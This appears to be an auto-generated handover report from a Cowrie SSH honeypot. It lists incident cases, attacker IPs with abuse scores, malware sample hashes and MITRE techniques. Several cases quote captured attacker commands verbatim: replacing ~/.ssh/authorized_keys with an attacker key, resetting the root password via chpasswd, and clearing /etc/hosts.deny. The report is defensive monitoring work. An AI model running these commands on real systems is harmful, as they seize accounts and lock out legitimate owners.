**Recommended Actions:**
- [ ] Submit `171.244.37[.]97` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-898c852ce4fd

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]97` |
| **First Seen** | 2026-06-06 06:29 |
| **Last Seen** | 2026-06-06 06:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 06:29:30` | `cowrie.session.connect` |
| `2026-06-06 06:29:30` | `cowrie.client.version` |
| `2026-06-06 06:29:30` | `cowrie.client.kex` |
| `2026-06-06 06:29:30` | `cowrie.login.success` |
| `2026-06-06 06:29:30` | `cowrie.session.params` |
| `2026-06-06 06:29:30` | `cowrie.command.input` |
| `2026-06-06 06:29:30` | `cowrie.command.failed` |
| `2026-06-06 06:29:31` | `cowrie.log.closed` |
| `2026-06-06 06:29:31` | `cowrie.session.params` |
| `2026-06-06 06:29:31` | `cowrie.command.input` |
| `2026-06-06 06:29:31` | `cowrie.session.file_download` |
| `2026-06-06 06:29:31` | `cowrie.log.closed` |
| `2026-06-06 06:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]97` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-537b93ade201

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]97` |
| **First Seen** | 2026-06-06 06:29 |
| **Last Seen** | 2026-06-06 06:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 06:29:33` | `cowrie.session.connect` |
| `2026-06-06 06:29:33` | `cowrie.client.version` |
| `2026-06-06 06:29:33` | `cowrie.client.kex` |
| `2026-06-06 06:29:33` | `cowrie.login.success` |
| `2026-06-06 06:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]97` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a96d14238b94

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-06 06:39 |
| **Last Seen** | 2026-06-06 06:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 06:39:12` | `cowrie.session.connect` |
| `2026-06-06 06:39:12` | `cowrie.client.version` |
| `2026-06-06 06:39:12` | `cowrie.client.kex` |
| `2026-06-06 06:39:12` | `cowrie.login.success` |
| `2026-06-06 06:39:13` | `cowrie.session.params` |
| `2026-06-06 06:39:13` | `cowrie.command.input` |
| `2026-06-06 06:39:13` | `cowrie.command.failed` |
| `2026-06-06 06:39:13` | `cowrie.log.closed` |
| `2026-06-06 06:39:13` | `cowrie.session.params` |
| `2026-06-06 06:39:13` | `cowrie.command.input` |
| `2026-06-06 06:39:13` | `cowrie.session.file_download` |
| `2026-06-06 06:39:13` | `cowrie.log.closed` |
| `2026-06-06 06:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89308a72faee

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-06 06:39 |
| **Last Seen** | 2026-06-06 06:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 06:39:15` | `cowrie.session.connect` |
| `2026-06-06 06:39:15` | `cowrie.client.version` |
| `2026-06-06 06:39:15` | `cowrie.client.kex` |
| `2026-06-06 06:39:16` | `cowrie.login.success` |
| `2026-06-06 06:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3d84cca0f70

| Field | Detail |
|---|---|
| **Source IP** | `223.221.38[.]226` |
| **First Seen** | 2026-06-06 06:45 |
| **Last Seen** | 2026-06-06 06:46 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:yc1MPShtvOI0"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 06:45:50` | `cowrie.session.connect` |
| `2026-06-06 06:45:50` | `cowrie.client.version` |
| `2026-06-06 06:45:52` | `cowrie.client.kex` |
| `2026-06-06 06:45:53` | `cowrie.login.success` |
| `2026-06-06 06:45:55` | `cowrie.session.params` |
| `2026-06-06 06:45:55` | `cowrie.command.input` |
| `2026-06-06 06:45:55` | `cowrie.command.failed` |
| `2026-06-06 06:45:57` | `cowrie.log.closed` |
| `2026-06-06 06:45:59` | `cowrie.session.params` |
| `2026-06-06 06:45:59` | `cowrie.command.input` |
| `2026-06-06 06:46:00` | `cowrie.session.file_download` |
| `2026-06-06 06:46:00` | `cowrie.log.closed` |
| `2026-06-06 06:46:16` | `cowrie.session.params` |
| `2026-06-06 06:46:16` | `cowrie.command.input` |
| `2026-06-06 06:46:17` | `cowrie.log.closed` |
| `2026-06-06 06:46:17` | `cowrie.session.params` |
| `2026-06-06 06:46:17` | `cowrie.command.input` |
| `2026-06-06 06:46:18` | `cowrie.log.closed` |
| `2026-06-06 06:46:18` | `cowrie.session.params` |
| `2026-06-06 06:46:18` | `cowrie.command.input` |
| `2026-06-06 06:46:18` | `cowrie.session.file_download` |
| `2026-06-06 06:46:18` | `cowrie.log.closed` |
| `2026-06-06 06:46:19` | `cowrie.session.params` |
| `2026-06-06 06:46:19` | `cowrie.command.input` |
| `2026-06-06 06:46:20` | `cowrie.log.closed` |
| `2026-06-06 06:46:20` | `cowrie.session.params` |
| `2026-06-06 06:46:20` | `cowrie.command.input` |
| `2026-06-06 06:46:21` | `cowrie.log.closed` |
| `2026-06-06 06:46:22` | `cowrie.session.params` |
| `2026-06-06 06:46:22` | `cowrie.command.input` |
| `2026-06-06 06:46:22` | `cowrie.command.input` |
| `2026-06-06 06:46:22` | `cowrie.log.closed` |
| `2026-06-06 06:46:22` | `cowrie.session.params` |
| `2026-06-06 06:46:22` | `cowrie.command.input` |
| `2026-06-06 06:46:27` | `cowrie.log.closed` |
| `2026-06-06 06:46:34` | `cowrie.session.params` |
| `2026-06-06 06:46:34` | `cowrie.command.input` |
| `2026-06-06 06:46:36` | `cowrie.log.closed` |
| `2026-06-06 06:46:37` | `cowrie.session.params` |
| `2026-06-06 06:46:37` | `cowrie.command.input` |
| `2026-06-06 06:46:39` | `cowrie.log.closed` |
| `2026-06-06 06:46:39` | `cowrie.session.params` |
| `2026-06-06 06:46:39` | `cowrie.command.input` |
| `2026-06-06 06:46:40` | `cowrie.log.closed` |
| `2026-06-06 06:46:40` | `cowrie.session.params` |
| `2026-06-06 06:46:40` | `cowrie.command.input` |
| `2026-06-06 06:46:41` | `cowrie.log.closed` |
| `2026-06-06 06:46:42` | `cowrie.session.params` |
| `2026-06-06 06:46:42` | `cowrie.command.input` |
| `2026-06-06 06:46:42` | `cowrie.log.closed` |
| `2026-06-06 06:46:43` | `cowrie.session.params` |
| `2026-06-06 06:46:43` | `cowrie.command.input` |
| `2026-06-06 06:46:43` | `cowrie.log.closed` |
| `2026-06-06 06:46:43` | `cowrie.session.params` |
| `2026-06-06 06:46:43` | `cowrie.command.input` |
| `2026-06-06 06:46:45` | `cowrie.log.closed` |
| `2026-06-06 06:46:45` | `cowrie.session.params` |
| `2026-06-06 06:46:45` | `cowrie.command.input` |
| `2026-06-06 06:46:45` | `cowrie.log.closed` |
| `2026-06-06 06:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.221.38[.]226` to AbuseIPDB if not already reported
- [ ] Block `223.221.38[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.221.38[.]226` | **31** | 2026-06-06 05:14 | 2026-06-06 06:52 | 40m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.124[.]121` | **25** | 2026-06-06 04:16 | 2026-06-06 04:22 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `185.117.153[.]20` | **20** | 2026-06-06 04:24 | 2026-06-06 04:59 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `167.99.119[.]225` | **10** | 2026-06-06 04:57 | 2026-06-06 06:55 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `152.32.187[.]177` | **6** | 2026-06-06 04:10 | 2026-06-06 04:28 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `171.244.37[.]97` | **4** | 2026-06-06 05:16 | 2026-06-06 06:29 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `203.175.125[.]130` | **4** | 2026-06-06 04:15 | 2026-06-06 04:31 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `103.61.122[.]229` | **2** | 2026-06-06 06:35 | 2026-06-06 06:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.74[.]93` | **2** | 2026-06-06 04:00 | 2026-06-06 04:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.151[.]242` | 1 | 2026-06-06 05:47 | 2026-06-06 05:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.51[.]94` | 1 | 2026-06-06 03:50 | 2026-06-06 03:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.0.0[.]10` | 1 | 2026-06-06 06:12 | 2026-06-06 06:13 | 31s | 0 | `T1592` | 🟢 LOW |
| `173.249.52[.]138` | 1 | 2026-06-06 06:39 | 2026-06-06 06:39 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.188.116[.]41` | 1 | 2026-06-06 04:08 | 2026-06-06 04:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.212.136[.]3` | 1 | 2026-06-06 05:31 | 2026-06-06 05:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.133.137[.]101` | 1 | 2026-06-06 04:10 | 2026-06-06 04:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.179.134[.]3` | 1 | 2026-06-06 06:23 | 2026-06-06 06:23 | 12s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]160` | 1 | 2026-06-06 05:40 | 2026-06-06 05:40 | 4s | 0 | `T1592` | 🟢 LOW |
| `67.205.189[.]163` | 1 | 2026-06-06 04:15 | 2026-06-06 04:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `185.117.153[.]20` | RU | PSERVERS Enterprise Network | **100** ⚠️ | 0 |
| `167.99.119[.]225` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `223.123.124[.]121` | PK | CMPak Limited | **100** ⚠️ | 7 |
| `203.175.125[.]130` | ID | PT Radio Dutacakrawala Serasi | **100** ⚠️ | 32 |
| `210.212.136[.]3` | IN | National Internet Backbone | **100** ⚠️ | 20 |
| `152.32.187[.]177` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 25 |
| `223.221.38[.]226` | CN | CHINANET Qinghai Province Network | **100** ⚠️ | 50 |
| `67.205.189[.]163` | US | DigitalOcean, LLC | **100** ⚠️ | 30 |
| `171.244.37[.]97` | VN | Viettel Group | **100** ⚠️ | 50 |
| `43.133.137[.]101` | ID | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 74 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |

---

## 🔕 False Positive Summary (67 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 35 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 28 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 197 cases |
| Tool 34  | Credential Extractor        | ✅ 67 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 67 filtered (34.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 16 priority case(s) shown individually · 19 recon entry/entries in table (9 group(s) consolidating 104 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-06T06:56:39Z_
